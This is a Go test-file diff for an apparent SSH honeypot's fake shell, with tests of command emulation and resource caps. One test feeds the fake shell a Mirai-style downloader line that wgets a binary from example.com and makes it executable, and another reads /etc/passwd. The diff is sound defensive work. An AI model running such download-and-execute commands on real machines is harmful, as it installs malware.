@@ -3,6 +3,8 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"strconv"
+	"strings"
 	"testing"
 
 	"golang.org/x/crypto/ssh"
@@ -237,6 +239,96 @@ func TestParseSSHExecCommandCap(t *testing.T) {
 	got := parseSSHExecCommand(payload)
 	if len(got) != sshExecMaxBytes {
 		t.Fatalf("len = %d, want %d", len(got), sshExecMaxBytes)
+	}
+}
+
+func TestNormalizeExeCleansDotPath(t *testing.T) {
+	if got := normalizeExe("/bin/./uname"); got != "uname" {
+		t.Fatalf("normalizeExe = %q, want uname", got)
+	}
+}
+
+func TestFakeShellUnameDotPath(t *testing.T) {
+	shell := newFakeShell("root", ubuntuPersona())
+	got := shell.execute("/bin/./uname -s -v -n -r -m")
+	want := "Linux #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 ubuntu-server 5.15.0-91-generic x86_64\r\n"
+	if got != want {
+		t.Fatalf("uname dot path = %q, want %q", got, want)
+	}
+}
+
+func TestFakeShellPipelineGrepWc(t *testing.T) {
+	shell := newFakeShell("root", ubuntuPersona())
+	got := shell.execute("cat /etc/passwd | grep root | wc -l")
+	if got != "       1\r\n" {
+		t.Fatalf("pipeline output = %q, want one matching line", got)
+	}
+}
+
+func TestFakeShellRedirectionDoesNotBreakCommand(t *testing.T) {
+	shell := newFakeShell("root", ubuntuPersona())
+	got := shell.execute("uname -m >/tmp/arch 2>/dev/null")
+	if got != "" {
+		t.Fatalf("redirected command output = %q, want no terminal output", got)
+	}
+	if got := shell.execute("cat /tmp/arch"); got != "x86_64\r\n" {
+		t.Fatalf("redirected file content = %q, want uname output", got)
+	}
+}
+
+func TestFakeShellDownloaderCreatesFileAndChmod(t *testing.T) {
+	shell := newFakeShell("root", ubuntuPersona())
+	if got := shell.execute("cd /tmp; wget http://example.com/bins/mirai.x86; chmod +x mirai.x86; ls -l mirai.x86"); !strings.Contains(got, "-rwxr-xr-x") || !strings.Contains(got, "mirai.x86") {
+		t.Fatalf("download/chmod/ls output = %q", got)
+	}
+}
+
+func TestFakeShellVariablesCommandSubstitutionAndGlob(t *testing.T) {
+	shell := newFakeShell("root", ubuntuPersona())
+	got := shell.execute("echo $USER $(uname -m); touch /tmp/a /tmp/b; ls /tmp/a*")
+	if !strings.Contains(got, "root x86_64\r\n") || !strings.Contains(got, "a\r\n") {
+		t.Fatalf("expanded output = %q", got)
+	}
+}
+
+func TestFakeShellAndOrExitStatus(t *testing.T) {
+	shell := newFakeShell("root", ubuntuPersona())
+	got := shell.execute("false && echo bad || echo ok")
+	if got != "ok\r\n" {
+		t.Fatalf("&&/|| output = %q, want ok", got)
+	}
+}
+
+func TestFakeShellCompactUnameFlags(t *testing.T) {
+	shell := newFakeShell("root", ubuntuPersona())
+	got := shell.execute("uname -snrm")
+	if got != "Linux ubuntu-server 5.15.0-91-generic x86_64\r\n" {
+		t.Fatalf("compact uname output = %q", got)
+	}
+}
+
+func TestFakeShellCapsInMemoryFiles(t *testing.T) {
+	shell := newFakeShell("root", ubuntuPersona())
+	for i := 0; i < maxFakeFiles+20; i++ {
+		shell.putFakeFile("/tmp/file"+strconv.Itoa(i), fakeFile{content: "x"})
+	}
+	if len(shell.files) != maxFakeFiles {
+		t.Fatalf("fake file count = %d, want cap %d", len(shell.files), maxFakeFiles)
+	}
+	shell.putFakeFile("/tmp/file0", fakeFile{content: strings.Repeat("x", maxFakeFileBytes+1000)})
+	if got := len(shell.files["/tmp/file0"].content); got > maxFakeFileBytes {
+		t.Fatalf("large fake file size = %d, want <= %d", got, maxFakeFileBytes)
+	}
+	if got := shell.fakeFSBytes(); got > maxFakeFSBytes {
+		t.Fatalf("fake fs bytes = %d, want <= %d", got, maxFakeFSBytes)
+	}
+}
+
+func TestFakeShellCapsCommandExpansion(t *testing.T) {
+	shell := newFakeShell("root", ubuntuPersona())
+	line := "echo $(" + strings.Repeat("echo abc;", 3000) + ")"
+	if got := shell.expandShellLine(line, 3); len(got) > maxShellExpandedBytes {
+		t.Fatalf("expanded line length = %d, want <= %d", len(got), maxShellExpandedBytes)
 	}
 }
 
